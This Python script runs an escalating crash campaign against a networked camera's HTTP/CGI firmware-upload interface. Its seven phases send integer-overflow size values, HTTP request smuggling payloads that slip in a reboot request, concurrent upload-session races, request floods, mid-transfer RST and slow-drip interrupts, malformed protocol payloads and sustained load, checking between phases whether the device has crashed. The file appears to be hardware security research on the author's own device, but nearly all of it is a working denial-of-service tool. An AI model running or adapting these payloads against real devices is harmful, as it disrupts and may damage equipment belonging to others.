#!/usr/bin/env python3
"""
crash_v3.py — Escalated crash campaign targeting kernel-level disruption.

Previous best: 15s watchdog recovery (app-level crash caught by watchdog).
Goal this time:
  1. Integer overflow via firmware size (0xFFFFFFFF wraps to 0 in 32-bit)
  2. HTTP request smuggling (ambiguous Content-Length vs body)
  3. Concurrent upload session races (10+ simultaneous startsenddata)
  4. Signal-level resource exhaustion (fork bomb via rapid CGI invocations)
  5. Mid-chunk interrupt at precise timing (race condition)
  6. HTTP/1.0 vs 1.1 protocol confusion

Safety: AC power on, no flash writes (we never send valid firmware data to
the final-write endpoint). RAM-only corruption at worst.
"""
import socket
import struct
import threading
import time
import sys
import os
import signal

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, Net, parse_camrply, UA

IP = "192.168.1.131"
PORT = 80
CHUNK_SIZE = 61192
TOTAL_SIZE = 90238464

def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)

def raw_conn(timeout=5):
    """Create a raw TCP connection to the camera."""
    s = socket.create_connection((IP, PORT), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except:
        pass
    return s

def raw_send_recv(s, payload, recv_size=65536, timeout=5):
    """Send raw payload and read response."""
    try:
        s.sendall(payload)
    except Exception as e:
        return None
    try:
        s.settimeout(timeout)
        data = b""
        while len(data) < recv_size:
            c = s.recv(65536)
            if not c:
                break
            data += c
        return data
    except:
        return b""

def phase1_integer_overflow():
    """Phase 1: Try integer overflow in firmware size parameter.
    32-bit ARM: if size is stored as uint32, 0xFFFFFFFF = 4294967295 wraps.
    Also try: -1 (as signed), 2^31, 2^32, and other boundary values."""
    log("\n" + "="*60)
    log("PHASE 1: Integer overflow in firmware size")
    log("="*60)

    sizes = [
        (4294967295, "0xFFFFFFFF (uint32 max)"),
        (4294967294, "0xFFFFFFFE"),
        (2147483648, "2^31 (int32 overflow)"),
        (4294967296, "2^32 (uint32 wrap to 0)"),
        (1, "minimum"),
        (0, "zero"),
        (-1, "negative (as decimal)"),
        (9999999999999999, "huge (64-bit?)"),
        (8589934592, "2^33"),
        (16777216, "2^24 (16MB - typical buffer)"),
        (65536, "2^16 (64KB)"),
        (61192, "exact 1 chunk"),
        (61193, "1 chunk + 1"),
        (61191, "1 chunk - 1"),
    ]

    for size, desc in sizes:
        try:
            ka = KA(IP, port=PORT, timeout=5)
            st, hdrs, body, dt = ka.request(
                "GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % size)
            r = parse_camrply(body).get("result", "?")
            log("  size=%d (%s) -> %s (%.0fms)" % (size, desc, r, dt*1000))
            ka.close()
        except Exception as e:
            log("  size=%d (%s) -> EXC %s" % (size, desc, type(e).__name__))

        # Check health after each
        time.sleep(0.5)
        try:
            ka2 = KA(IP, port=PORT, timeout=3)
            st2, _, body2, _ = ka2.request("GET", "/cam.cgi?mode=getstate")
            r2 = parse_camrply(body2).get("result", "?")
            if r2.lower() != "ok":
                log("  !! Health check failed: %s" % r2)
                ka2.close()
                time.sleep(5)
                continue
            ka2.close()
        except:
            log("  !! Health check exception")
            time.sleep(5)

def phase2_http_smuggling():
    """Phase 2: HTTP request smuggling via ambiguous Content-Length.
    If the camera's HTTP parser reads Content-Length first but the CGI
    framework has its own body reader, we can smuggle a second request."""
    log("\n" + "="*60)
    log("PHASE 2: HTTP request smuggling")
    log("="*60)

    payloads = [
        # Cl. + Cl. (first is wrong)
        (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Content-Type: multipart/form-data; boundary=X\r\n"
         b"Content-Length: 100\r\n"
         b"Content-Length: 50\r\n\r\n"
         b"A" * 50 + b"\r\n\r\n"
         b"GET /cam.cgi?mode=reboot HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n\r\n"),
        # Transfer-Encoding: chunked + Content-Length
        (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Transfer-Encoding: chunked\r\n"
         b"Content-Length: 60\r\n\r\n"
         b"3a\r\n" + b"B" * 58 + b"\r\n"
         b"0\r\n\r\n"
         b"GET /cam.cgi?mode=reboot HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n\r\n"),
        # Chunked with invalid chunk size (negative)
        (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Transfer-Encoding: chunked\r\n\r\n"
         b"-1\r\n"
         b"C" * 100 + b"\r\n"
         b"0\r\n\r\n"),
        # Chunked with huge chunk size
        (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Transfer-Encoding: chunked\r\n\r\n"
         b"FFFFFFFF\r\n"
         b"D" * 1000 + b"\r\n"
         b"0\r\n\r\n"),
        # Duplicate Content-Type with different values
        (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Content-Type: multipart/form-data; boundary=X\r\n"
         b"Content-Type: application/x-www-form-urlencoded\r\n"
         b"Content-Length: 30\r\n\r\n"
         b"E" * 30),
        # HTTP/0.9 style (no headers)
        (b"GET /cam.cgi?mode=reboot\r\n"),
        # Extra CRLF before request line
        (b"\r\n"
         b"GET /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n\r\n"),
        # Request with \n instead of \r\n
        (b"GET /cam.cgi?mode=getstate HTTP/1.1\n"
         b"Host: " + IP.encode() + b"\n\n"),
    ]

    for i, p in enumerate(payloads):
        try:
            s = raw_conn(timeout=5)
            resp = raw_send_recv(s, p)
            s.close()
            if resp:
                log("  smuggling %d: %d bytes back: %.80s" % (i+1, len(resp), resp[:80]))
            else:
                log("  smuggling %d: no response (connection closed?)" % (i+1))
        except Exception as e:
            log("  smuggling %d: EXC %s" % (i+1, type(e).__name__))
        time.sleep(0.5)

def phase3_concurrent_sessions():
    """Phase 3: Start 10+ simultaneous upload sessions on different
    connections, each sending conflicting sizes, to race the allocation
    code and exhaust resources."""
    log("\n" + "="*60)
    log("PHASE 3: Concurrent upload session race")
    log("="*60)

    results = []

    def start_session(tid, size):
        try:
            ka = KA(IP, port=PORT, timeout=8)
            # Open gate
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
            gate_ok = b"ok" in body
            # Start session with conflicting size
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % size)
            r = parse_camrply(body).get("result", "?")
            results.append((tid, "start", r, dt))

            # Send a small chunk
            boundary = "=====%d" % tid
            chunk = b"F" * 10000
            body_m = ("--%s\r\n"
                      'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
            body_m += chunk + b"--%s--" % boundary
            req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
                   "Host: %s\r\n"
                   "User-Agent: LUMIX Sync\r\n"
                   "Content-Type: multipart/form-data; boundary=%s\r\n"
                   "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
            st, _, body, dt = ka.send(req.encode() if isinstance(req, str) else req)
            r2 = parse_camrply(body).get("result", "?") if body else "no_response"
            results.append((tid, "chunk", r2, dt))

            # Try to end while others are still going
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
            r3 = parse_camrply(body).get("result", "?") if body else "no_response"
            results.append((tid, "end", r3, dt))

            ka.close()
        except Exception as e:
            results.append((tid, "exc", type(e).__name__, 0))

    # Launch 12 concurrent sessions with different sizes
    sizes = [TOTAL_SIZE, TOTAL_SIZE//2, TOTAL_SIZE*2, 65536, 1, 4294967295,
             1000, 999999999, 50000, 80000, 123456, 777777]

    threads = []
    for tid in range(12):
        th = threading.Thread(target=start_session, args=(tid, sizes[tid]))
        th.start()
        threads.append(th)
        time.sleep(0.05)  # slight stagger to create race window

    for th in threads:
        th.join(timeout=15)

    log("  Results (%d sessions):" % len(results))
    for tid, phase, result, dt in sorted(results):
        log("    [%02d] %s: %s (%.0fms)" % (tid, phase, result, dt*1000))

def phase4_fork_bomb():
    """Phase 4: Rapid CGI invocation to exhaust process/file-descriptor
    slots. If the CGI handler forks a process per request, 200 rapid
    requests might exhaust the process table."""
    log("\n" + "="*60)
    log("PHASE 4: Fork bomb (200 rapid requests, 30 concurrent)")
    log("="*60)

    results = [0, 0]  # [success, fail]
    lock = threading.Lock()

    def rapid_request(tid):
        try:
            s = raw_conn(timeout=3)
            # Mix of valid and invalid requests
            requests = [
                ("GET /cam.cgi?mode=getstate HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
                ("GET /cam.cgi?mode=startsenddata&type=fw&value=999999999 HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
                ("GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
            ]
            for r in requests:
                try:
                    s.sendall(r)
                    s.recv(4096)
                except:
                    break
            s.close()
            with lock:
                results[0] += 1
        except:
            with lock:
                results[1] += 1

    # 30 concurrent, each doing 3 requests = 90 rapid requests
    # Then repeat for another round
    for round_num in range(3):
        log("  Round %d: 30 concurrent x 3 requests..." % (round_num+1))
        threads = []
        for t in range(30):
            th = threading.Thread(target=rapid_request, args=(t,))
            th.start()
            threads.append(th)
        for th in threads:
            th.join(timeout=10)
        log("  Round %d: %d ok, %d fail" % (round_num+1, results[0], results[1]))
        time.sleep(1)

def phase5_midchunk_interrupt():
    """Phase 5: Send a chunk, then at precise timing interrupt the
    connection mid-transfer. The camera may be in a state where it's
    waiting for more data but gets a FIN/RST."""
    log("\n" + "="*60)
    log("PHASE 5: Mid-chunk connection interrupt")
    log("="*60)

    # Setup: open gate + start session
    try:
        ka = KA(IP, port=PORT, timeout=8)
        ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
    except:
        log("  Setup failed")
        return

    # Send a partial chunk (start of a 61KB chunk but only send 10KB then RST)
    boundary = "=====INT"
    full_chunk = b"I" * 10000  # only 10KB
    body = ("--%s\r\n"
            'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: 61192\r\n\r\n" % boundary)
    # Claim 61192 bytes but only send 10000
    body += full_chunk
    body += b"--%s--" % boundary

    req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
           "Host: %s\r\n"
           "User-Agent: LUMIX Sync\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body)))
    req_bytes = req.encode() + body.encode() if isinstance(body, str) else req.encode() + body

    # Actually let's build it properly:
    body_b = body.encode() if isinstance(body, str) else body
    req_final = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: LUMIX Sync\r\n"
                 "Content-Type: multipart/form-data; boundary=%s\r\n"
                 "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_b)))
    req_final = req_final.encode() + body_b

    # Method 1: Send partial then close
    log("  Method 1: Send partial chunk then close...")
    try:
        s = raw_conn(timeout=5)
        # Send only the first 5000 bytes of the request
        s.sendall(req_final[:5000])
        time.sleep(0.1)
        s.close()  # TCP FIN
        log("    Sent 5000 bytes, closed. Waiting 2s...")
        time.sleep(2)
        # Check if camera is ok
        ka2 = KA(IP, port=PORT, timeout=5)
        st, _, body2, dt = ka2.request("GET", "/cam.cgi?mode=getstate")
        log("    getstate: %s" % parse_camrply(body2).get("result", "?"))
        ka2.close()
    except Exception as e:
        log("    EXC: %s" % type(e).__name__)

    # Method 2: Send partial then RST (abort)
    log("  Method 2: Send partial then RST...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((IP, PORT))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.sendall(req_final[:3000])
        time.sleep(0.05)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        s.close()  # This sends RST due to SO_LINGER with 0 timeout
        log("    Sent 3000 bytes, RST. Waiting 2s...")
        time.sleep(2)
        ka2 = KA(IP, port=PORT, timeout=5)
        st, _, body2, dt = ka2.request("GET", "/cam.cgi?mode=getstate")
        log("    getstate: %s" % parse_camrply(body2).get("result", "?"))
        ka2.close()
    except Exception as e:
        log("    EXC: %s" % type(e).__name__)

    # Method 3: Send full chunk header claiming 64KB, send 1KB, wait, send rest
    log("  Method 3: Slow drip feed (1KB every 2s for 30s)...")
    try:
        s = raw_conn(timeout=60)
        # Send header
        s.sendall(req_final[:500])
        time.sleep(0.5)
        # Drip feed the rest in 1KB chunks with 2s delay
        remaining = req_final[500:]
        sent = 0
        for i in range(10):
            chunk = remaining[i*1024:(i+1)*1024]
            if not chunk:
                break
            s.sendall(chunk)
            sent += len(chunk)
            time.sleep(2)
            if sent >= len(remaining):
                break
        s.close()
        log("    Dripped %d bytes over %ds" % (sent, len(remaining)//1024*2))
        time.sleep(3)
        ka2 = KA(IP, port=PORT, timeout=5)
        st, _, body2, dt = ka2.request("GET", "/cam.cgi?mode=getstate")
        log("    getstate: %s" % parse_camrply(body2).get("result", "?"))
        ka2.close()
    except Exception as e:
        log("    EXC: %s" % type(e).__name__)

def phase6_protocol_confusion():
    """Phase 6: Mix HTTP/1.0 and 1.1 on same connection, upgrade attempts,
    and malformed method lines."""
    log("\n" + "="*60)
    log("PHASE 6: Protocol confusion")
    log("="*60)

    payloads = [
        # HTTP/1.0 (no keep-alive) then immediately another request
        (b"GET /cam.cgi?mode=getstate HTTP/1.0\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"
         b"GET /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"),
        # Upgrade to WebSocket
        (b"GET /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Upgrade: websocket\r\n"
         b"Connection: Upgrade\r\n"
         b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
         b"Sec-WebSocket-Version: 13\r\n\r\n"),
        # Invalid method
        (b"PATCH /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"),
        (b"OPTIONS /cam.cgi HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n"
         b"Origin: http://evil.com\r\n"
         b"Access-Control-Request-Method: GET\r\n\r\n"),
        # Very long URL (4KB path)
        (b"GET /" + b"A" * 4096 + b" HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"),
        # Very long header value (8KB)
        (b"GET /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"X-Long-Header: " + b"H" * 8192 + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"),
        # Empty request line
        (b"\r\n\r\n"),
        # Binary garbage after valid request
        (b"GET /cam.cgi?mode=getstate HTTP/1.1\r\n"
         b"Host: " + IP.encode() + b"\r\n"
         b"User-Agent: LUMIX Sync\r\n\r\n"
         + bytes(range(256))),
    ]

    for i, p in enumerate(payloads):
        try:
            s = raw_conn(timeout=5)
            resp = raw_send_recv(s, p, recv_size=8192)
            s.close()
            if resp:
                log("  proto %d: %d bytes: %.60s" % (i+1, len(resp), resp[:60]))
            else:
                log("  proto %d: no response" % (i+1))
        except Exception as e:
            log("  proto %d: EXC %s" % (i+1, type(e).__name__))
        time.sleep(0.5)

def phase7_sustained_pressure():
    """Phase 7: 60 seconds of continuous mixed traffic. If the camera has
    any resource that degrades under load (memory leak, fd leak, thread
    exhaustion), this should surface it."""
    log("\n" + "="*60)
    log("PHASE 7: 60s sustained pressure")
    log("="*60)

    stop_flag = [False]
    stats = {"reqs": 0, "errors": 0}
    lock = threading.Lock()

    def worker(tid):
        while not stop_flag[0]:
            try:
                s = raw_conn(timeout=3)
                # Random mix of requests
                rtype = tid % 5
                if rtype == 0:
                    req = ("GET /cam.cgi?mode=getstate HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                elif rtype == 1:
                    req = ("GET /cam.cgi?mode=startsenddata&type=fw&value=999999999 HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                elif rtype == 2:
                    req = ("GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                elif rtype == 3:
                    req = ("GET /cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00 HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode()
                else:
                    req = (b"POST /cam.cgi?mode=senddata HTTP/1.1\r\nHost: " + IP.encode() +
                           b"\r\nUser-Agent: LUMIX Sync\r\nContent-Length: 100\r\n\r\n" + b"P" * 100)
                s.sendall(req)
                s.recv(4096)
                s.close()
                with lock:
                    stats["reqs"] += 1
            except:
                with lock:
                    stats["errors"] += 1

    # 10 workers, run for 60 seconds
    threads = []
    for t in range(10):
        th = threading.Thread(target=worker, args=(t,))
        th.daemon = True
        th.start()
        threads.append(th)

    log("  Running 10 workers for 60s...")
    for i in range(6):
        time.sleep(10)
        log("  %ds: %d reqs, %d errors" % ((i+1)*10, stats["reqs"], stats["errors"]))

    stop_flag[0] = True
    for th in threads:
        th.join(timeout=5)

    log("  Total: %d reqs, %d errors in 60s" % (stats["reqs"], stats["errors"]))

def health_check():
    """Quick health check."""
    try:
        ka = KA(IP, port=PORT, timeout=5)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=getstate")
        r = parse_camrply(body).get("result", "?")
        ka.close()
        return r
    except:
        return "OFFLINE"

def wait_for_recovery(max_wait=180):
    """Wait for camera to come back."""
    log("\n  Waiting for camera recovery (max %ds)..." % max_wait)
    start = time.time()
    while time.time() - start < max_wait:
        r = health_check()
        if r.lower() == "ok":
            log("  Camera recovered after %.0fs" % (time.time() - start))
            return True
        time.sleep(5)
    log("  Camera NOT recovered after %ds" % max_wait)
    return False

def main():
    log("S5 Camera CRASH v3 - Kernel-level escalation")
    log("Target: %s" % IP)
    log("WARNING: May cause extended downtime. AC power required.")
    log("")

    # Verify camera is up
    r = health_check()
    if r.lower() != "ok":
        log("Camera not ready: %s" % r)
        return
    log("Camera confirmed up. Starting attack sequence.")

    phases = [
        (1, phase1_integer_overflow, "Integer overflow"),
        (2, phase2_http_smuggling, "HTTP smuggling"),
        (3, phase3_concurrent_sessions, "Concurrent session race"),
        (4, phase4_fork_bomb, "Fork bomb"),
        (5, phase5_midchunk_interrupt, "Mid-chunk interrupt"),
        (6, phase6_protocol_confusion, "Protocol confusion"),
        (7, phase7_sustained_pressure, "Sustained pressure"),
    ]

    for num, func, name in phases:
        log("\n\n>>> STARTING PHASE %d: %s" % (num, name))
        try:
            func()
        except Exception as e:
            log("  PHASE %d EXCEPTION: %s: %s" % (num, type(e).__name__, e))

        # Post-phase health check
        time.sleep(3)
        r = health_check()
        if r.lower() == "ok":
            log("  [post-%d] Camera healthy: %s" % (num, r))
        else:
            log("  [post-%d] Camera NOT healthy: %s" % (num, r))
            if r == "OFFLINE":
                log("  Camera appears crashed! Waiting for recovery...")
                if not wait_for_recovery(180):
                    log("  !! Camera did NOT recover. STOPPING all further phases.")
                    log("  You may need to power-cycle the camera.")
                    return
                log("  Camera recovered. Continuing with next phase.")

    # Final status
    log("\n" + "="*60)
    log("ALL PHASES COMPLETE")
    log("="*60)
    r = health_check()
    log("Final state: %s" % r)

if __name__ == "__main__":
    main()
